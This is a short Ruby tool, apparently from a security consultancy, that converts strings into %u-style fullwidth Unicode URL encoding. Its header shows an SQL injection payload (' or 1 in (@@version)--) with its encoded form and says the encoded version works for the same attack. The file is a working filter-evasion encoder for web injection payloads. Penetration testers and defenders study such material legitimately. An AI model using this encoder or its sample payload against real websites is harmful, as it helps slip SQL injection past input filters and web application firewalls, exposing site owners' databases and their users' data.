# Ruby Script to generate URL encoded Unicode UTF-8 URL.
# Author: Gary O'leary-Steele of Sec-1 Ltd
# Example:
# The string ' or 1 in (@@version)-- is encoded as and work for the same SQL injection attack
# %u02b9%u0020%uff4f%uff52%u0020%uff11%u0020%uff49%uff4e%u0020%uff08%u0040%u0040%uff56%uff45%uff52%uff53%uff49%uff4f%uff4e%uff09%uff0d%uff0d
#
#

require 'uri'
def unicode_url(string)
  lookuptable = Hash.new
  lookuptable ={
    ' ' => '%u0020',
    '/' => '%u2215',
    '\\' => '%u2215',
    "'" => '%u02b9',
    '"' => '%u0022',
    '>' => '%u003e',
    '<' => '%u003c',
    '#' => '%uff03',
    '!' => '%uff01',
    '$' => '%uff04',
    '*' => '%uff0a',
    '@' => '%u0040',
    '.' => '%uff0e',
    '_' => '%uff3f',
    '(' => '%uff08',
    ')' => '%uff09',
    ',' => '%uff0c',
    '%' => '%u0025',
    '-' => '%uff0d',
    ';' => '%uff1b',
    ':' => '%uff1a',
    '|' => '%uff5c',
    '&' => '%uff06',
    '+' => '%uff0b',
    '=' => '%uff1d',
    'a' => '%uff41',
    'A' => '%uff21',
    'b' => '%uff42',
    'B' => '%uff22',
    'c' => '%uff43',
    'C' => '%uff23',
    'd' => '%uff44',
    'D' => '%uff24',
    'e' => '%uff45',
    'E' => '%uff25',
    'f' => '%uff46',
    'F' => '%uff26',
    'g' => '%uff47',
    'G' => '%uff27',
    'h' => '%uff48',
    'H' => '%uff28',
    'i' => '%uff49',
    'I' => '%uff29',
    'j' => '%uff4a',
    'J' => '%uff2a',
    'k' => '%uff4b',
    'K' => '%uff2b',
    'l' => '%uff4c',
    'L' => '%uff2c',
    'm' => '%uff4d',
    'M' => '%uff2d',
    'n' => '%uff4e',
    'N' => '%uff2e',
    'o' => '%uff4f',
    'O' => '%uff2f',
    'p' => '%uff50',
    'P' => '%uff30',
    'q' => '%uff51',
    'Q' => '%uff31',
    'r' => '%uff52',
    'R' => '%uff32',
    's' => '%uff53',
    'S' => '%uff33',
    't' => '%uff54',
    'T' => '%uff34',
    'u' => '%uff55',
    'U' => '%uff35',
    'v' => '%uff56',
    'V' => '%uff36',
    'w' => '%uff57',
    'W' => '%uff37',
    'x' => '%uff58',
    'X' => '%uff38',
    'y' => '%uff59',
    'Y' => '%uff39',
    'z' => '%uff5a',
    'Z' => '%uff3a',
    '0' => '%uff10',
    '1' => '%uff11',
    '2' => '%uff12',
    '3' => '%uff13',
    '4' => '%uff14',
    '5' => '%uff15',
    '6' => '%uff16',
    '7' => '%uff17',
    '8' => '%uff18',
    '9' => '%uff19'}

  # Convert string to array of chars
  chararray = string.scan(/./)
  newstr = String.new
  chararray.each do |c|
          if lookuptable.has_key? c
                  newstr = newstr + lookuptable[c]
          else
                  newstr = newstr + URI.escape(c)
          end
  end

  return newstr
end

print "Enter string to URL Unicode:"
puts unicode_url(gets)
